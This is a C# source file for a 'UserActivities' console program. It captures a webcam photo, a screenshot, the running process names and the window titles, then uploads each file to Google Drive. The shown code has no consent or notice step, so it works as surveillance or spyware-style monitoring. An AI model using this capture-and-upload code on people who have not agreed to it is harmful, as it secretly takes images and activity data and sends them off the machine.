using Infrastructure.DirectoryManager;
using Infrastructure.EgmaCV;
using Infrastructure.GoogleDriveApi;
using Infrastructure.RunningPrograms;
using Infrastructure.ScreenCapture;
using System;
using System.Threading.Tasks;

namespace UserActivities
{
    public class Application
    {
        private readonly IEgmaCvAdapter _egmaCvAdapter;
        private readonly IDirectoryManagerService _directoryManagerService;
        private readonly IGoogleDriveApiManagerAdapter _googleDriveApiManagerAdapter;
        private readonly IScreenCaptureService _screenCaptureService;
        private readonly IRunningProgramService _runningProgramService;
        private string _folderName;

        public Application(IEgmaCvAdapter egmaCvAdapter, 
            IDirectoryManagerService directoryManagerService,
            IGoogleDriveApiManagerAdapter googleDriveApiManagerAdapter,
            IScreenCaptureService screenCaptureService,
            IRunningProgramService runningProgramService)
        {
            _egmaCvAdapter = egmaCvAdapter;
            _directoryManagerService = directoryManagerService;
            _folderName = AppSettingsInfo.GetCurrentValue<string>("FolderName");
            _googleDriveApiManagerAdapter = googleDriveApiManagerAdapter;
            _screenCaptureService = screenCaptureService;
            _runningProgramService = runningProgramService;
        }

        public async Task Run()
        {
            try
            {
                Console.WriteLine("Starting User Activities");

                //Capture webcam image and sync to google drive
                var fileName = $"{Guid.NewGuid()}.jpg";
                var filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _egmaCvAdapter.CaptureImageAsync(0, filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                //Capture user screen and sync to google drive
                fileName = $"{Guid.NewGuid()}.jpg";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _screenCaptureService.CaptureScreenAsync(1920, 1080, filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                //Capture processes and sync to google drive 
                fileName = $"Processes-{Guid.NewGuid()}.txt";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _runningProgramService.CaptureProcessNameAsync(filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);

                //Capture running program title and sync to google drive 
                fileName = $"ProgramTitles-{Guid.NewGuid()}.txt";
                filePath = _directoryManagerService.CreateProgramDataFilePath(_folderName, fileName);
                await _runningProgramService.CaptureProgramTitleAsync(filePath);
                await _googleDriveApiManagerAdapter.UploadFileAsync(filePath);


                Console.WriteLine("Done");
            }
            catch (Exception exp)
            {
                Console.WriteLine(exp.Message);
            }
        }
    }
}
